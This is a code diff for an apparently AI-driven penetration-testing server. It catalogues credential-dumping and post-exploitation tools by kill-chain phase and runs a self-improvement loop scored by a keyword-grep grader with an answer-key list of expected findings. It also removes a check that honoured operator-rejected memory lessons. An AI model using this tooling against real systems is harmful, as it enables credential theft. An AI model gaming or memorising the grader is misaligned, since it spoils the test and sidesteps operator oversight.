   schedulePersist(type);
 }
 
+// Hook Tripwire & Cyber Deception engine into SSE event bus and Webhook dispatcher
+TripwireManager.onTrigger((event: TripwireTriggerEvent) => {
+  emitContractEvent('tripwire.triggered', { ...event });
+  WebhookDispatcher.broadcast({
+    event: 'tripwire_triggered',
+    title: `Tripwire Trap Triggered: ${event.tripwireName}`,
+    severity: 'critical',
+    target: event.attackerIp,
+    details: `Attacker IP ${event.attackerIp} interacted with honeytoken "${event.tripwireName}" (${event.tripwireType}) at ${event.timestamp}. Method: ${event.method} ${event.path}.`,
+    proof: event.bodySnippet || (event.headers ? JSON.stringify(event.headers, null, 2) : undefined),
+    metadata: { ...event },
+    timestamp: event.timestamp
+  }).catch(() => {});
+});
+
 // =============================================================================
 // SERVER-SENT EVENTS (SSE) - REAL-TIME EVENT STREAMING
 // =============================================================================
@@ -4905,8 +5864,18 @@ app.get(['/health', '/api/health'], (_req: Request, res: Response) => {
   });
 });
 
-app.get('/api/preflight', async (_req: Request, res: Response) => {
-  res.json(await buildPreflightReport());
+let preflightCache: { at: number; report: Record<string, unknown> } | null = null;
+app.get('/api/preflight', async (req: Request, res: Response) => {
+  // Diagnostic report — the heavy part is the tool-availability probe. Serve a 60s cache;
+  // `?refresh=1` re-derives on demand.
+  const refresh = req.query.refresh === '1' || req.query.refresh === 'true';
+  if (!refresh && preflightCache && Date.now() - preflightCache.at < 60_000) {
+    res.json(preflightCache.report);
+    return;
+  }
+  const report = await buildPreflightReport();
+  preflightCache = { at: Date.now(), report };
+  res.json(report);
 });
 
 app.get('/api/mission-context/latest', (_req: Request, res: Response) => {
@@ -4990,6 +5959,99 @@ app.post('/api/arsenal/plan', (req: Request, res: Response) => {
 
 app.get('/api/arsenal/activation', (_req: Request, res: Response) => {
   res.json(buildArsenalActivationPlan());
+});
+
+// GET /api/arsenal/phase-readiness?phase=<canonical kill-chain phase>
+// Honest per-phase capability check for the War Room SITREP: when the operator focuses an offensive
+// phase (exploitation / installation / command_and_control / actions_on_objectives), report whether a
+// REAL credential/post-ex path actually exists — i.e. is the specialist arsenal armed
+// (T3MP3ST_FULL_ARSENAL) and are the underlying binaries installed — so ENGAGE never implies a
+// capability the box can't back. Read-only; runs a few PATH lookups.
+const PHASE_TOOLKITS: Record<string, Array<{ id: string; name: string; risk: string; binary: string; note: string }>> = {
+  exploitation: [
+    { id: 'metasploit_module', name: 'Metasploit', risk: 'dangerous', binary: 'msfconsole', note: 'exploit + credential-harvest / hashdump post modules' },
+    { id: 'hydra_bruteforce', name: 'THC-Hydra', risk: 'credential', binary: 'hydra', note: 'online credential brute-force; parses recovered login:password' },
+    { id: 'mimikatz', name: 'mimikatz', risk: 'credential', binary: 'mimikatz', note: 'Windows credential extraction (sekurlsa::logonpasswords, lsadump) from live memory / hives' },
+    { id: 'creddump7', name: 'creddump7', risk: 'credential', binary: 'creddump7', note: 'offline pwdump/cachedump/lsadump from registry hives or memory images' },
+    { id: 'rubeus', name: 'Rubeus', risk: 'credential', binary: 'rubeus', note: 'Kerberos abuse — kerberoast / AS-REP roast / ticket harvest' },
+    { id: 'xsser', name: 'XSSer', risk: 'active', binary: 'xsser', note: 'automatic XSS detection/exploitation (reflected, stored, DOM, XST)' },
+  ],
+  installation: [
+    { id: 'metasploit_module', name: 'Metasploit', risk: 'dangerous', binary: 'msfconsole', note: 'persistence / post modules' },
+  ],
+  command_and_control: [
+    { id: 'metasploit_module', name: 'Metasploit', risk: 'dangerous', binary: 'msfconsole', note: 'session handling / C2' },
+  ],
+  actions_on_objectives: [
+    { id: 'metasploit_module', name: 'Metasploit', risk: 'dangerous', binary: 'msfconsole', note: 'loot / credential gather post modules' },
+    { id: 'hydra_bruteforce', name: 'THC-Hydra', risk: 'credential', binary: 'hydra', note: 'lateral credential brute-force' },
+    { id: 'mimikatz', name: 'mimikatz', risk: 'credential', binary: 'mimikatz', note: 'post-exploitation credential dump for lateral movement' },
+    { id: 'rubeus', name: 'Rubeus', risk: 'credential', binary: 'rubeus', note: 'Kerberos ticket harvest / roast for lateral pivots' },
+  ],
+};
+app.get('/api/arsenal/phase-readiness', async (req: Request, res: Response): Promise<void> => {
+  const phase = typeof req.query.phase === 'string' ? req.query.phase : '';
+  const armed = /^(1|true|on)$/i.test(process.env.T3MP3ST_FULL_ARSENAL ?? '');
+  const toolkit = PHASE_TOOLKITS[phase] || [];
+  const tools = await Promise.all(toolkit.map(async (t) => {
+    // A real path needs BOTH the specialist arsenal armed AND the binary installed. Approval is a
+    // separate per-action gate at run time. A probe that FAILED is reported as 'probe-failed',
+    // never as 'binary-missing' — an unverified binary is not a missing one.
+    const loc = await findBinaryLocation(t.binary).catch(() => null);
+    const probeFailed = loc?.probeFailed === true;
+    const binaryAvailable = loc?.available === true;
+    const status = !armed ? 'not-armed' : (probeFailed ? 'probe-failed' : (!binaryAvailable ? 'binary-missing' : 'ready'));
+    return { id: t.id, name: t.name, risk: t.risk, binary: t.binary, note: t.note, armed, binaryAvailable, probeFailed, status };
+  }));
+  const offensive = toolkit.length > 0;
+  const ready = tools.some((t) => t.status === 'ready');
+  // "Not installed" is only assertable when every probe actually completed. A failed probe
+  // leaves the truth unknown, and saying "not installed" then is a false negative the operator
+  // would act on (installing tools they already have).
+  const anyProbeFailed = tools.some((t) => t.probeFailed);
+  res.json({
+    phase,
+    offensive,
+    fullArsenalArmed: armed,
+    approvalGated: true,
+    tools,
+    ready,
+    probeInconclusive: anyProbeFailed,
+    // A short honest headline the UI can show verbatim.
+    summary: !offensive
+      ? 'This phase runs on built-in recon/analysis tools.'
+      : ready
+        ? 'A real credential/post-ex path is available (armed + binary present). Actions are still approval-gated at run time.'
+        : !armed
+          ? 'No live credential/post-ex path: the specialist arsenal is not armed (set T3MP3ST_FULL_ARSENAL=1).'
+          : anyProbeFailed
+            ? 'Arsenal armed, but the binary probe did not complete (WSL layer unreachable or slow) — availability is UNKNOWN, not absent. Re-check in a moment.'
+            : 'Specialist arsenal armed, but the required binaries are not installed on this host.',
+  });
+});
+
+// =============================================================================
+// BURP SUITE INTEGRATION & PROXY BRIDGE
+// =============================================================================
+
+// GET /api/burp/status — check binary installation, Kali WSL path, and proxy listener status
+app.get('/api/burp/status', async (req: Request, res: Response): Promise<void> => {
+  const host = typeof req.query.host === 'string' ? req.query.host : undefined;
+  const port = typeof req.query.port === 'string' ? parseInt(req.query.port, 10) : undefined;
+  res.json(await burpManager.getStatus(host, port));
+});
+
+// POST /api/burp/proxy/enable — route outbound agent traffic through Burp Suite proxy
+app.post('/api/burp/proxy/enable', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body || {};
+  const host = typeof body.host === 'string' ? body.host : undefined;
+  const port = typeof body.port === 'number' ? body.port : undefined;
+  res.json(await burpManager.enableInterception(host, port));
+});
+
+// POST /api/burp/proxy/disable — disable Burp proxy routing
+app.post('/api/burp/proxy/disable', (_req: Request, res: Response): void => {
+  res.json(burpManager.disableInterception());
 });
 
 // Capability-approval gate state (TOOL-level, distinct from the action-level /api/approvals
@@ -5723,34 +6785,6 @@ app.get('/api/findings', (req: Request, res: Response) => {
   res.json(redactSecrets({ findings }));
 });
 
-// Findings export: CSV or raw JSON for reports / bug-bounty submissions.
-app.get('/api/findings/export', (req: Request, res: Response) => {
-  const missionId = typeof req.query.missionId === 'string' ? req.query.missionId : '';
-  const format = typeof req.query.format === 'string' ? req.query.format.toLowerCase() : 'csv';
-  const findings = [...findingsLedger.values()]
-    .filter(finding => !missionId || finding.missionId === missionId)
-    .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt));
-  const clean = findings.map((f) => ({
-    id: f.id, title: f.title, severity: f.severity, status: f.status, family: f.family,
-    target: f.target, claim: f.claim, confidence: f.confidence, recommendedFix: f.recommendedFix,
-    createdAt: f.createdAt, updatedAt: f.updatedAt,
-  }));
-  if (format === 'json') {
-    res.setHeader('Content-Type', 'application/json');
-    res.json(redactSecrets({ findings: clean }));
-    return;
-  }
-  const esc = (v: unknown): string => {
-    const s = String(v ?? '');
-    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
-  };
-  const header = ['id', 'title', 'severity', 'status', 'family', 'target', 'claim', 'confidence', 'recommendedFix', 'createdAt', 'updatedAt'];
-  const rows = clean.map((f) => header.map((h) => esc((f as unknown as Record<string, unknown>)[h])).join(','));
-  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
-  res.setHeader('Content-Disposition', `attachment; filename="findings-${new Date().toISOString().slice(0, 10)}.csv"`);
-  res.send([header.join(','), ...rows].join('\r\n'));
-});
-
 app.post('/api/findings', (req: Request, res: Response) => {
   const body = req.body as Record<string, unknown>;
   if (rejectDuplicateLedgerId(res, findingsLedger, body.id, 'Finding', '/api/findings')) return;
@@ -6107,10 +7141,6 @@ app.post('/api/memory/proposals', (req: Request, res: Response) => {
     return;
   }
   const proposal = createMemoryProposal(body);
-  if (!proposal) {
-    res.status(200).json({ suppressed: true, reason: 'An identical lesson was previously rejected — respecting the operator decision.' });
-    return;
-  }
   res.status(201).json(proposal);
 });
 
@@ -6213,6 +7243,478 @@ app.get('/api/selfimprove/ledger', async (_req: Request, res: Response): Promise
   });
 });
 
+// =============================================================================
+// SELF-IMPROVEMENT RUN MANAGEMENT — spawns the real obsidivm-evolve CLI from
+// the Self-Improvement menu ("Run a pass now"), with a single-run lock, a live
+// log, and a wipe-lineage reset. Params are whitelisted (no free-form command).
+// =============================================================================
+const SI_EVO_DIR = join(process.cwd(), 'bench', 'obsidivm-evolution');
+const SI_LOG_FILE = join(SI_EVO_DIR, 'run-live.log');
+let siRun: { proc: ReturnType<typeof spawn>; startedAt: string; hunter: string } | null = null;
+
+const SI_HUNTERS = ['stub', 'live', 't3mp3st'];
+const SI_SLUG = /^[A-Za-z0-9._-]{1,64}$/;
+
+function siValidateParams(body: Record<string, unknown>): { ok: true; args: string[] } | { ok: false; error: string } {
+  const hunter = String(body.hunter || 'stub');
+  if (!SI_HUNTERS.includes(hunter)) return { ok: false, error: 'hunter must be stub|live|t3mp3st' };
+  const judgeModel = String(body.judgeModel || 'claude-sonnet-4-5');
+  if (!SI_SLUG.test(judgeModel)) return { ok: false, error: 'invalid judgeModel' };
+  // Missing fields default to the documented values; only PRESENT-and-invalid rejects.
+  const acceptThreshold = body.acceptThreshold === undefined || body.acceptThreshold === ''
+    ? 0.7 : Number(body.acceptThreshold);
+  if (!Number.isFinite(acceptThreshold) || acceptThreshold < 0 || acceptThreshold > 1) return { ok: false, error: 'acceptThreshold must be 0..1' };
+  const maxGens = body.maxGens === undefined || body.maxGens === '' ? 1 : parseInt(String(body.maxGens), 10);
+  if (!Number.isFinite(maxGens) || maxGens < 1 || maxGens > 20) return { ok: false, error: 'maxGens must be 1..20' };
+  const pruneAfter = body.pruneAfter === undefined || body.pruneAfter === '' ? 3 : parseInt(String(body.pruneAfter), 10);
+  if (!Number.isFinite(pruneAfter) || pruneAfter < 1 || pruneAfter > 10) return { ok: false, error: 'pruneAfter must be 1..10' };
+  const targetGrade = String(body.targetGrade || '').trim();
+  if (targetGrade && !/^[ABCDEF][+-]?$/.test(targetGrade)) return { ok: false, error: 'targetGrade must look like A, B+, C' };
+  const target = String(body.target || 'obsidivm');
+  if (!SI_SLUG.test(target)) return { ok: false, error: 'invalid target' };
+  const args = ['scripts/obsidivm-evolve.mjs', '--hunter', hunter, '--judge-model', judgeModel,
+    '--accept-threshold', String(acceptThreshold), '--max-gens', String(maxGens),
+    '--prune-after', String(pruneAfter)];
+  if (targetGrade) args.push('--target-grade', targetGrade);
+  // 'obsidivm' is the legacy menu default meaning "everything in the spec";
+  // a concrete target id filters to one container.
+  if (target && target !== 'obsidivm' && target !== 'all') args.push('--target', target);
+  return { ok: true, args };
+}
+
+// OBSIDIVM range contract (GET /api/spec) — served by THIS server so the
+// evolve/bench chain runs on this box: the range targets are our own running
+// CTF containers, with honest expected-findings lists (original range schema:
+// keyword grep + negative-keyword hedging penalty, weights critical=4/high=3/
+// medium=2/low=1).
+const SI_NEG = ['not vulnerable', 'not exploitable', 'unable to confirm', 'could not confirm',
+  'no evidence', 'false positive', 'hypothetical', 'would test', 'should test'];
+function siRangeSpec(): Record<string, any> {
+  const exp = (cat: string, id: string, title: string, sev: string, keywords: string[]): Record<string, unknown> =>
+    ({ cat, id, title, severity: sev, sev, keywords, negative_keywords: SI_NEG });
+  return {
+    spec_version: 't3mp3st-range/2026-09-13.1',
+    generated: new Date().toISOString(),
+    targets: [
+      {
+        id: 'sqli-basic', name: 'CTF SQLi Basics', port: 8080,
+        creds: 'n/a', difficulty: 'easy',
+        vulns: 'SQL injection (union, error-based), database disclosure, table enumeration',
+        expected: [
+          exp('injection', 'SQLI-001', 'SQL Injection (UNION)', 'critical', ['sqli', 'union', 'database']),
+          exp('injection', 'SQLI-002', 'Error-based SQL Injection', 'high', ['error-based', 'sql error', 'mysql', 'sqlite']),
+          exp('disclosure', 'SQLI-003', 'Database Version / Name Disclosure', 'high', ['version', 'database name', 'sqlite_master']),
+          exp('disclosure', 'SQLI-004', 'Table / Column Enumeration', 'medium', ['table', 'column', 'schema', 'enumeration']),
+        ],
+      },
+      {
+        id: 'sqli-blind', name: 'CTF Blind SQLi', port: 8081,
+        creds: 'n/a', difficulty: 'medium',
+        vulns: 'Blind SQL injection (boolean-based, time-based), character-by-character extraction',
+        expected: [
+          exp('injection', 'BSQLI-001', 'Boolean-based Blind SQL Injection', 'high', ['blind', 'boolean', 'true', 'false']),
+          exp('injection', 'BSQLI-002', 'Time-based Blind SQL Injection', 'high', ['sleep', 'delay', 'time-based']),
+          exp('disclosure', 'BSQLI-003', 'Character-by-Character Data Extraction', 'medium', ['substring', 'ascii', 'character', 'extract']),
+        ],
+      },
+      {
+        id: 'ssrf-metadata', name: 'CTF SSRF Metadata', port: 8083,
+        creds: 'n/a', difficulty: 'medium',
+        vulns: 'SSRF, internal service probing, file scheme reads, metadata endpoint access',
+        expected: [
+          exp('ssrf', 'SSRF-001', 'Server-Side Request Forgery', 'critical', ['ssrf', 'server-side request', 'url parameter']),
+          exp('disclosure', 'SSRF-002', 'Internal Metadata / Service Access', 'high', ['metadata', 'internal', '169.254', 'localhost']),
+          exp('disclosure', 'SSRF-003', 'File Scheme Arbitrary Read', 'high', ['file://', '/etc/passwd', 'file scheme']),
+        ],
+      },
+      {
+        id: 'pwn-bof-basic', name: 'CTF Buffer Overflow (ret2win)', port: 9001,
+        creds: 'n/a', difficulty: 'easy',
+        vulns: 'Stack buffer overflow, no canary, no PIE, partial RELRO — ret2win',
+        expected: [
+          exp('rce', 'BOF-001', 'Stack Buffer Overflow', 'critical', ['buffer overflow', 'overflow', 'padding', 'offset']),
+          exp('rce', 'BOF-002', 'Return Address Control', 'high', ['return address', 'eip', 'rip', 'control']),
+          exp('rce', 'BOF-003', 'Ret2win Execution (win function)', 'critical', ['ret2win', 'win function', 'flag']),
+        ],
+      },
+      {
+        id: 'pwn-format-string', name: 'CTF Format String (GOT Overwrite)', port: 9002,
+        creds: 'n/a', difficulty: 'medium',
+        vulns: 'Format string arbitrary read/write, GOT overwrite, no PIE, partial RELRO',
+        expected: [
+          exp('rce', 'FMT-001', 'Format String Arbitrary Read', 'critical', ['format string', '%s', '%p', 'leak']),
+          exp('disclosure', 'FMT-002', 'Stack / Memory Disclosure', 'high', ['stack', 'leak', 'pointer', 'address']),
+          exp('rce', 'FMT-003', 'GOT Overwrite via %n', 'critical', ['got overwrite', '%n', 'write primitive']),
+        ],
+      },
+    ],
+  };
+}
+app.get('/api/spec', (_req: Request, res: Response): void => {
+  res.json(siRangeSpec());
+});
+
+// Range scorer — the original python range's POST /api/score/text contract.
+// Keyword-grep scoring: a finding is DETECTED when one of its positive keywords
+// appears in the transcript, vetoed when a negative (hedging) keyword sits on
+// the same line. Weights: critical 4 / high 3 / medium 2 / low 1 / info 1.
+// Grade bands on weighted percent: A+≥97 A≥90 B+≥80 B≥70 C+≥60 C≥50 D≥40 F<40.
+app.post('/api/score/text', (req: Request, res: Response): void => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  const targetId = String(body.target_id || '');
+  const text = String(body.text || '');
+  const spec = siRangeSpec();
+  const target = (spec.targets || []).find((t: any) => t.id === targetId);
+  if (!target) { res.status(404).json({ error: 'unknown target: ' + targetId }); return; }
+  const lines = text.split('\n');
+    const results = (target.expected || []).map((e: any) => {
+      let evidence: any = null;
+      let vetoed = false;
+      for (let i = 0; i < lines.length && !evidence; i++) {
+        const low = lines[i].toLowerCase();
+        const kw = (e.keywords || []).find((k: string) => low.includes(k.toLowerCase()));
+        if (kw) {
+          if ((e.negative_keywords || []).some((nk: string) => low.includes(nk.toLowerCase()))) { vetoed = true; continue; }
+          evidence = { line: i + 1, keyword: kw, snippet: lines[i].trim().slice(0, 220) };
+        }
+      }
+      const weight = e.severity === 'critical' ? 4 : e.severity === 'high' ? 3 : e.severity === 'medium' ? 2 : 1;
+      const detected = !!evidence && !vetoed;
+      return { ...e, detected, weight, evidence, vetoed };
+    });
+    const found = results.filter((r: any) => r.detected).length;
+    const weightedFound = results.reduce((s: number, r: any) => s + (r.detected ? r.weight : 0), 0);
+    const weightedTotal = results.reduce((s: number, r: any) => s + r.weight, 0) || 1;
+    const percent = Math.round((found / results.length) * 10000) / 100;
+    const weightedPercent = Math.round((weightedFound / weightedTotal) * 10000) / 100;
+    const grade = weightedPercent >= 97 ? 'A+' : weightedPercent >= 90 ? 'A' : weightedPercent >= 80 ? 'B+' : weightedPercent >= 70 ? 'B' : weightedPercent >= 60 ? 'C+' : weightedPercent >= 50 ? 'C' : weightedPercent >= 40 ? 'D' : 'F';
+    res.json({
+      version: 't3mp3st-range/2026-09-13.1',
+      generated: new Date().toISOString(),
+      target_id: targetId,
+      found, total: results.length, percent,
+      weighted_found: weightedFound, weighted_total: weightedTotal,
+      weighted_percent: weightedPercent, grade,
+      results,
+    });
+});
+
+function siTailLog(): string {
+  try {
+    return readFileSync(SI_LOG_FILE, 'utf8').slice(-4000);
+  } catch { return ''; }
+}
+
+app.get('/api/selfimprove/run', (_req: Request, res: Response): void => {
+  const running = !!siRun && !siRun.proc.killed && siRun.proc.exitCode === null;
+  res.json({
+    running,
+    startedAt: siRun?.startedAt || null,
+    hunter: siRun?.hunter || null,
+    logTail: siTailLog(),
+  });
+});
+
+app.post('/api/selfimprove/run', async (req: Request, res: Response): Promise<void> => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  if (siRun && siRun.proc.exitCode === null && !siRun.proc.killed) {
+    res.status(409).json({ success: false, error: 'A self-improvement pass is already running (started ' + siRun.startedAt + '). Stop it first.' });
+    return;
+  }
+  const v = siValidateParams(body);
+  if (!v.ok) { res.status(400).json({ success: false, error: v.error }); return; }
+  try {
+    await mkdir(SI_EVO_DIR, { recursive: true });
+    await writeFile(SI_LOG_FILE, '[pass started ' + new Date().toISOString() + '] ' + v.args.join(' ') + '\n');
+    const proc = spawn(process.execPath, v.args, {
+      cwd: process.cwd(),
+      stdio: ['ignore', 'pipe', 'pipe'],
+      // The evolve chain fetches the range spec from OBSIDIVM_URL — serve it
+      // from THIS server (GET /api/spec maps our running CTF containers).
+      env: { ...process.env, OBSIDIVM_URL: 'http://127.0.0.1:3333', T3MP3ST_API_URL: 'http://127.0.0.1:3333' },
+    });
+    siRun = { proc, startedAt: new Date().toISOString(), hunter: String(body.hunter || 'stub') };
+    proc.stdout?.on('data', (c) => { appendFile(SI_LOG_FILE, String(c)).catch(() => {}); });
+    proc.stderr?.on('data', (c) => { appendFile(SI_LOG_FILE, String(c)).catch(() => {}); });
+    proc.on('exit', (code) => {
+      appendFile(SI_LOG_FILE, '\n[exit code ' + code + ' at ' + new Date().toISOString() + ']\n').catch(() => {});
+      if (siRun?.proc === proc) siRun = null;
+    });
+    res.json({ success: true, running: true, startedAt: siRun.startedAt, logFile: SI_LOG_FILE });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: 'spawn failed: ' + (err?.message || err) });
+  }
+});
+
+app.post('/api/selfimprove/run/stop', (_req: Request, res: Response): void => {
+  if (!siRun || siRun.proc.exitCode !== null) { res.status(404).json({ success: false, error: 'No running pass' }); return; }
+  try {
+    if (process.platform === 'win32') spawn('taskkill', ['/pid', String(siRun.proc.pid), '/T', '/F']);
+    else siRun.proc.kill('SIGTERM');
+    res.json({ success: true, stopped: true });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: 'stop failed: ' + (err?.message || err) });
+  }
+});
+
+app.post('/api/selfimprove/reset', async (_req: Request, res: Response): Promise<void> => {
+  if (siRun && siRun.proc.exitCode === null && !siRun.proc.killed) {
+    res.status(409).json({ success: false, error: 'A pass is running — stop it before resetting the lineage.' });
+    return;
+  }
+  try {
+    await new Promise<void>((resolve, reject) => {
+      const proc = spawn(process.execPath, ['scripts/obsidivm-evolve.mjs', '--reset'], { cwd: process.cwd(), stdio: ['ignore', 'pipe', 'pipe'] });
+      let tail = '';
+      proc.stdout?.on('data', (c) => { tail = (tail + c).slice(-2000); });
+      proc.stderr?.on('data', (c) => { tail = (tail + c).slice(-2000); });
+      proc.on('exit', (code) => (code === 0 ? resolve() : reject(new Error('reset exited ' + code + ': ' + tail.slice(-300)))));
+      proc.on('error', reject);
+    });
+    res.json({ success: true, reset: true });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: 'reset failed: ' + (err?.message || err) });
+  }
+});
+
+// =============================================================================
+// SETTINGS → .env BRIDGE (GitHub-safe)
+// =============================================================================
+// The Settings page historically wrote keys only into window.localStorage
+// (UI-local). For a clean `git push` we persist every provider key into a
+// SINGLE real `.env` file — NOT into tracked source. Secrets must never live
+// in code and `.env` stays gitignored so the public repo carries only
+// `.env.example`. Storage rule: Settings keys → .env (source of truth);
+// localStorage is a non-authoritative mirror at most. No secret is ever
+// returned in cleartext over the API — status endpoints mask.
+
+const ENV_APIKEY_MAP: Record<string, string> = {
+  openrouter: 'OPENROUTER_API_KEY',
+  venice: 'VENICE_API_KEY',
+  anthropic: 'ANTHROPIC_API_KEY',
+  openai: 'OPENAI_API_KEY',
+  xai: 'XAI_API_KEY',
+  gemini: 'GEMINI_API_KEY',
+  deepseek: 'DEEPSEEK_API_KEY',
+  huggingface: 'HF_TOKEN',
+  nanogpt: 'NANOGPT_API_KEY',
+  novita: 'NOVITA_API_KEY',
+  litellm: 'LITELLM_API_KEY',
+  groq: 'GROQ_API_KEY',
+  together: 'TOGETHER_API_KEY',
+  replicate: 'REPLICATE_API_TOKEN',
+  github: 'GITHUB_TOKEN',
+  local: 'TEMPEST_LOCAL_API_KEY',
+  ollama: 'OLLAMA_API_KEY',
+  discord_webhook: 'DISCORD_WEBHOOK_URL',
+  slack_webhook: 'SLACK_WEBHOOK_URL',
+  siem_webhook: 'SIEM_WEBHOOK_URL',
+};
+
+function resolveEnvFile(): string {
+  // T3MP3ST-owned env lives at repo root /.env in dev, and at ~/.t3mp3st/.env on
+  // a user's machine — same locations ConfigManager reads (homedir) plus the
+  // repo file so "Settings → .env" is visible/edited where CI/local dev expects.
+  // Prefer the repo .env ONLY when cwd positively identifies as the t3mp3st package; otherwise homedir.
+  const repoEnv = join(process.cwd(), '.env');
+  const isT3mp3st = (() => {
+    if (process.env.T3MP3ST_DEV === '1') return true;
+    try {
+      const pkgPath = join(process.cwd(), 'package.json');
+      if (!existsSync(pkgPath)) return false;
+      const pkg = JSON.parse(readFileSync(pkgPath, 'utf8'));
+      return pkg?.name === 't3mp3st';
+    } catch {
+      return false;
+    }
+  })();
+
+  if (isT3mp3st) return repoEnv;
+  return join(homedir(), '.t3mp3st', '.env');
+}
+
+function maskKey(v: string | undefined): string {
+  if (!v || v.length < 4) return v ? '****' : '';
+  return `****${v.slice(-4)}`;
+}
+
+async function readEnvFileMap(filePath: string): Promise<Map<string, string>> {
+  const m = new Map<string, string>();
+  if (!existsSync(filePath)) return m;
+  const raw = await readFile(filePath, 'utf8');
+  for (const line of raw.split(/\r?\n/)) {
+    const t = line.trim();
+    if (!t || t.startsWith('#')) continue;
+    const eq = t.indexOf('=');
+    if (eq === -1) continue;
+    const k = t.slice(0, eq).trim();
+    const v = t.slice(eq + 1).trim().replace(/^["']|["']$/g, '');
+    m.set(k, v);
+  }
+  return m;
+}
+
+async function writeEnvKey(envVar: string, value: string): Promise<string> {
+  const filePath = resolveEnvFile();
+  await mkdir(dirname(filePath), { recursive: true });
+  const exists = existsSync(filePath);
+  let lines: string[] = [];
+  let raw = '';
+  if (exists) raw = await readFile(filePath, 'utf8');
+  // Preserve file as-is; only touch the one key line (or append).
+  if (raw) {
+    lines = raw.split(/\r?\n/);
+    // Drop trailing empty caused by final newline for clean rejoin.
+    if (lines.length && lines[lines.length - 1] === '' && raw.endsWith('\n')) lines.pop();
+  }
+  const needle = `${envVar}=`;
+  let idx = -1;
+  for (let i = 0; i < lines.length; i++) {
+    const t = lines[i].trim();
+    if (!t || t.startsWith('#')) continue;
+    if (t === envVar || t.startsWith(needle)) { idx = i; break; }
+  }
+  // Quote if value contains # or leading/trailing space or quotes — keep it simple.
+  const needsQuote = /[#\n\r"]/g.test(value) || /^\s|\s$/.test(value);
+  const serialized = needsQuote ? `${envVar}="${value.replace(/"/g, '\\"')}"` : `${envVar}=${value}`;
+  if (idx >= 0) lines[idx] = serialized;
+  else {
+    if (lines.length && lines[lines.length - 1].trim() !== '') lines.push('');
+    lines.push(serialized);
+  }
+  const out = lines.join('\n') + '\n';
+  await writeFile(filePath, out, 'utf8');
+  try { await chmod(filePath, 0o600); } catch { /* non-posix fs — ignore */ }
+  // Make it live for this process without persisting to Conf store (env has priority there).
+  process.env[envVar] = value;
+  return filePath;
+}
+
+// Boot-time persistence: keys injected via the environment (launcher shell, CI,
+// container) exist only in process.env — the durable gitignored .env never sees
+// them. Persist every real env key into .env once at startup so the file the
+// operator (and GitHub-safe workflow) expects actually holds the secrets.
+// Placeholders (sk-or-v1-xxxx…) and short values are skipped.
+async function persistEnvKeysToEnvFile(): Promise<void> {
+  try {
+    const filePath = resolveEnvFile();
+    const envMap = await readEnvFileMap(filePath);
+    for (const [provider, envVar] of Object.entries(ENV_APIKEY_MAP)) {
+      const val = (process.env[envVar] || '').trim();
+      if (val.length > 10 && !/x{4,}/i.test(val) && envMap.get(envVar) !== val) {
+        await writeEnvKey(envVar, val);
+        console.log(`[config:env] boot-migrated ${provider} (${envVar}) from process.env into ${filePath} (masked ${maskKey(val)})`);
+      }
+    }
+  } catch (e) {
+    console.error('[config:env] boot migration failed:', String((e as Error).message || e));
+  }
+}
+
+app.get('/api/config/env', async (_req: Request, res: Response) => {
+  const origin = _req.get('origin');
+  const sameOriginNetworkBind = !HOST_IS_LOOPBACK && isSameOriginAsHost(origin, _req.headers.host);
+  if (origin && !isLoopbackOrigin(origin) && !sameOriginNetworkBind) {
+    res.status(403).json({
+      error: 'Cross-origin request rejected',
+      detail: 'Configuration and environment metadata are only available to the localhost UI.',
+    });
+    return;
+  }
+  // Never emit raw secrets. Return masked map + which providers are configured.
+  try {
+    const filePath = resolveEnvFile();
+    const envMap = await readEnvFileMap(filePath);
+    const providers: Record<string, { configured: boolean; masked: string; envVar: string }> = {};
+    for (const [provider, envVar] of Object.entries(ENV_APIKEY_MAP)) {
+      // Effective value: process.env wins (may be injected at launch), else file.
+      const effective = (process.env[envVar]?.trim() || envMap.get(envVar) || '').trim();
+      // Also consider Conf store for completeness (legacy local write) — but never leak it.
+      const confVal = (() => { try { return (config.getApiKey(provider as any) || '').trim(); } catch { return ''; } })();
+      const val = effective || confVal;
+      // Template placeholders (sk-or-v1-xxxx…, hf_xxxx…) are not real keys —
+      // counting them as configured would make the UI skip migrating the real
+      // key it holds in localStorage into .env.
+      const isPlaceholder = /x{4,}/i.test(val);
+      providers[provider] = { configured: val.length > 10 && !isPlaceholder, masked: maskKey(isPlaceholder ? '' : val), envVar };
+    }
+    res.json({ file: filePath, exists: existsSync(filePath), providers });
+  } catch (e) {
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
+app.post('/api/config/env', async (req: Request, res: Response): Promise<void> => {
+  // Body: { provider: 'openrouter'|'venice'|..., key: '<raw>', baseUrl?: string }
+  // baseUrl is stored separately (currently localStorage-driven); we persist only the key into .env here.
+  try {
+    const body = (req.body ?? {}) as { provider?: string; key?: string; apiKey?: string; baseUrl?: string };
+    const provider = String(body.provider || '').trim().toLowerCase();
+    const rawKey = String(body.key ?? body.apiKey ?? '').trim();
+    if (!provider || !ENV_APIKEY_MAP[provider]) {
+      res.status(400).json({ error: `Unknown provider '${provider}'. Allowed: ${Object.keys(ENV_APIKEY_MAP).join(', ')}` });
+      return;
+    }
+    if (!rawKey || rawKey.length < 8) {
+      res.status(400).json({ error: 'Key too short — refusing to write.' });
+      return;
+    }
+    const envVar = ENV_APIKEY_MAP[provider];
+    const filePath = await writeEnvKey(envVar, rawKey);
+    // Optional: also mirror into Conf's apiKeys store so getApiKey() is coherent before next restart,
+    // but the durable truth is the .env file. Do NOT log the raw key.
+    try { (config as any).setApiKey?.(provider, rawKey); } catch { /* ignore */ }
+    console.log(`[config:env] ${provider} → ${envVar} written to ${filePath} (masked ${maskKey(rawKey)})`);
+    res.json({ ok: true, provider, envVar, file: filePath, masked: maskKey(rawKey) });
+  } catch (e) {
+    res.status(500).json({ error: String((e as Error).message || e) });
+  }
+});
+
+// Unified key-delete: remove from .env + process.env + Conf store.
+app.delete('/api/config/env/:provider', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const provider = String(req.params.provider || '').trim().toLowerCase();
+    if (!ENV_APIKEY_MAP[provider]) {
+      res.status(400).json({ error: `Unknown provider '${provider}'` });
+      return;
+    }
+    const envVar = ENV_APIKEY_MAP[provider];
+    const filePath = resolveEnvFile();
